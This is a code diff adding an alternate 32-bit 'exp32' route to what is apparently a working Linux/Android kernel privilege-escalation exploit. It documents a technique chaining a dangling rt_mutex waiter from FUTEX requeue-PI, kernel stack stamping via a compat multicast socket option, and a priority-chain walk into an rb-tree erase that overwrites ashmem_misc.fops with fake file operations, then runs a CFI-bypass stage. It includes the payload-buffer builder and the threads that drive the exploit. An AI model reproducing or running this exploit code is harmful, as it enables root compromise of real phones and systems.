@@ -164,6 +164,7 @@ void reset_main_route_state(void) {
   cfi_last_errno = 0;
 }
 
+#if !defined(APP_EXP32_ROUTE) || !APP_EXP32_ROUTE
 void run_main_route_threads(void) {
   reset_main_route_state();
 
@@ -190,6 +191,105 @@ void run_main_route_threads(void) {
     usleep(10000);
   }
 }
+#else
+/*
+ * r0q exp32 route - the write primitive runs in a disposable 32-bit child
+ * (src/exp32/, launched by api.c): the child leaves its pi_blocked_on
+ * dangling (CMP_REQUEUE_PI -> rt_mutex_start_proxy_lock), stamps its own
+ * kernel stack via a compat MCAST_JOIN_SOURCE_GROUP, and a consumer thread's
+ * sched_setattr drives rt_mutex_adjust_prio_chain step [7] into the
+ * rb_erase_cached that writes fake_fops into ashmem_misc.fops.
+ */
+#define EXP_BUF_NWORDS 16
+enum {
+  EXP_W_TREE_PC     = 0,   /* tree_entry.__rb_parent_color (parent, RED) */
+  EXP_W_TREE_RIGHT  = 1,
+  EXP_W_TREE_LEFT   = 2,   /* tree_entry.rb_left = WRITE TARGET */
+  EXP_W_PI_TREE_PC     = 3,
+  EXP_W_PI_TREE_RIGHT  = 4,
+  EXP_W_PI_TREE_LEFT   = 5,
+  EXP_W_TASK        = 6,   /* waiter->task */
+  EXP_W_LOCK        = 7,   /* waiter->lock */
+  EXP_W_PI_PRIO     = 8,
+  EXP_W_PI_DEADLINE = 9,
+};
+
+extern int exp_stack_once(uint64_t *buffer);
+atomic_int fake_fops_request;
+atomic_int fake_fops_done;
+
+static void build_exp_buffer_fops(uint64_t *buf) {
+  memset(buf, 0, EXP_BUF_NWORDS * sizeof(uint64_t));
+  buf[EXP_W_TREE_PC]       = fake_fops;
+  buf[EXP_W_TREE_RIGHT]    = 0;
+  buf[EXP_W_TREE_LEFT]     = text_addr(ASHMEM_MISC_FOPS);
+  buf[EXP_W_PI_TREE_PC]    = 0;
+  buf[EXP_W_PI_TREE_RIGHT] = 0;
+  buf[EXP_W_PI_TREE_LEFT]  = 0;
+  buf[EXP_W_TASK]          = fake_task;
+  buf[EXP_W_LOCK]          = fake_lock;
+  buf[EXP_W_PI_PRIO]       = 0;  /* overwritten with task->prio by the walk */
+  buf[EXP_W_PI_DEADLINE]   = 0;
+  pr_info("exp32 payload fake_fops=%016llx fake_lock=%016llx "
+          "write_target=%016llx\n",
+          (unsigned long long)fake_fops, (unsigned long long)fake_lock,
+          (unsigned long long)text_addr(ASHMEM_MISC_FOPS));
+}
+
+static int doreplacefops(void) {
+  if (!page_base || !fake_lock || !fake_fops) {
+    cfi_last_step = 30;
+    cfi_last_errno = 0;
+    pr_error("exp32 route missing kernel page base=%016zx lock=%016zx "
+             "fops=%016zx\n", page_base, fake_lock, fake_fops);
+    return 0;
+  }
+  uint64_t exp_buffer[EXP_BUF_NWORDS];
+  build_exp_buffer_fops(exp_buffer);
+  int ret = exp_stack_once(exp_buffer);
+  if (ret != 0) {
+    pr_warning("fops exp_stack_once failed ret=%d errno=%d\n", ret, errno);
+    return 0;
+  }
+  return 1;
+}
+
+static void *cfi_thread(void *arg __attribute__((unused))) {
+  while (!atomic_load(&cfi_stage_done)) {
+    atomic_store(&fake_fops_request, 1);
+    atomic_store(&fake_fops_done, 0);
+    while (!atomic_load(&fake_fops_done)) {
+      usleep(1000);
+    }
+    pr_info("enter CFI stage\n");
+    try_cfi_stage();
+  }
+  return NULL;
+}
+
+void run_main_route_threads(void) {
+  reset_main_route_state();
+
+  pthread_t cfi;
+  SYSCHK(pthread_create(&cfi, NULL, cfi_thread, NULL));
+
+  while (!atomic_load(&cfi_stage_done)) {
+    if (atomic_exchange(&pipe_prepare_request, 0)) {
+      pr_info("prepare_pipe_buffer_page\n");
+      pipebuf_page_base = prepare_pipe_buffer_page();
+      atomic_store(&pipe_prepare_done, 1);
+    }
+    if (atomic_exchange(&fake_fops_request, 0)) {
+      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_EXP32);
+      reset_main_route_state();
+      pr_info("replace_fake_fops this may cause deadlock\n");
+      doreplacefops();
+      atomic_store(&fake_fops_done, 1);
+    }
+    usleep(10000);
+  }
+}
+#endif
 #endif
 
 static pid_t spawn_allocation_keeper(void) {
